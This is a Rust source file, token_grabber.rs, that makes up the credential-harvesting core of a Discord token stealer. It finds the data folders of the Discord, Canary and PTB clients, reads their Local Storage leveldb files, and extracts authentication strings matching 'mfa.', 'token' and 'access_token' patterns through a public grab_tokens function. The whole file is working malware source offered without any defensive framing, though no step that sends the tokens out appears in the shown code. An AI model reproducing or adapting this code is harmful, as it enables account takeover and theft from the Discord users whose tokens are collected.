// src/token_grabber.rs
use std::fs;
use std::path::PathBuf;

fn get_discord_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    if let Some(appdata) = dirs::data_dir() {
        paths.push(appdata.join("discord"));
        paths.push(appdata.join("discordcanary"));
        paths.push(appdata.join("discordptb"));
    }
    
    if let Some(roaming) = dirs::config_dir() {
        paths.push(roaming.join("discord"));
        paths.push(roaming.join("discordcanary"));
        paths.push(roaming.join("discordptb"));
    }
    
    paths
}

fn extract_tokens_from_path(path: PathBuf) -> Vec<String> {
    let mut tokens = Vec::new();
    
    let leveldb_path = path.join("Local Storage").join("leveldb");
    
    if !leveldb_path.exists() {
        return tokens;
    }
    
    if let Ok(entries) = fs::read_dir(&leveldb_path) {
        for entry in entries.flatten() {
            let file_path = entry.path();
            if file_path.extension().map_or(false, |e| e == "ldb" || e == "log") {
                if let Ok(content) = fs::read_to_string(&file_path) {
                    extract_token_from_content(&content, &mut tokens);
                } else if let Ok(content) = fs::read(&file_path) {
                    let content_str = String::from_utf8_lossy(&content);
                    extract_token_from_content(&content_str, &mut tokens);
                }
            }
        }
    }
    
    tokens
}

fn extract_token_from_content(content: &str, tokens: &mut Vec<String>) {
    let patterns = [
        "mfa.",
        "token\":\"",
        "access_token\":\"",
    ];
    
    for pattern in &patterns {
        let mut start = 0;
        while let Some(pos) = content[start..].find(pattern) {
            let absolute_pos = start + pos;
            let token_start = absolute_pos + pattern.len();
            
            if let Some(token_end) = content[token_start..].find('"') {
                let token = &content[token_start..token_start + token_end];
                
                if token.len() > 20 && token.len() < 100 && !tokens.contains(&token.to_string()) {
                    tokens.push(token.to_string());
                }
            }
            
            start = token_start;
        }
    }
}

pub fn grab_tokens() -> Vec<String> {
    let mut all_tokens = Vec::new();
    
    for path in get_discord_paths() {
        let tokens = extract_tokens_from_path(path);
        for token in tokens {
            if !all_tokens.contains(&token) {
                all_tokens.push(token);
            }
        }
    }
    
    all_tokens
}
